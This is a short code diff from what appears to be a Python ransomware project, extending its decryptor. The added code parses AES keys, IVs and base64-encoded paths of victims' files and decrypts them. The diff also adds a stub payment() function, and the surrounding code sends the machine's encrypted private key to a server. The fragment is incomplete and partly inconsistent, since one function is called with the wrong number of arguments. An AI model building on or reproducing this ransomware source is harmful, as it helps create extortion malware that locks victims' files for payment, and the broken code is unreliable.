@@ -20,6 +20,8 @@ def send_to_server_encrypted_private_key(id, private_encrypted_key):
         f.write(str(private_key))
 
 
+def payment():
+    pass
 
 
 def menu():
@@ -31,7 +33,7 @@ def menu():
     ransomware_path = os.path.join(home, ransomware_name[0])
     id = enviroment.get_unique_machine_id()
 
-
+    # send to server encrypted private key to be decrypted
     send_to_server_encrypted_private_key(id)
 
     # import the private key
@@ -46,15 +48,24 @@ def menu():
 
     # decrypt aes keys file
     decrypted_content = Client_private_key.decrypt(encrypted_content)
+     
+    # get the aes keys and IV's and paths back
     decrypted_content = decrypted_content.split('\n')
     aes_keys = []
-
+    aes_ivs = []
+    files_path = []
     for line in decrypted_content:
-        aes_keys.append(key.split(' ')[0])
+        ret = line.split(' ') # KEY IV base64(PATH)
+        aes_keys.append(ret[0])
+        aes_ivs.append(ret[1])
+        files_path.append(base64.b64decode(ret[2]))
 
 
+    # decrypt all files 
+    decrypt(files_path, aes_keys, aes_ivs)
 
 
+    # end of decryptor
 
 if __name__ == "__main__": 
     menu()
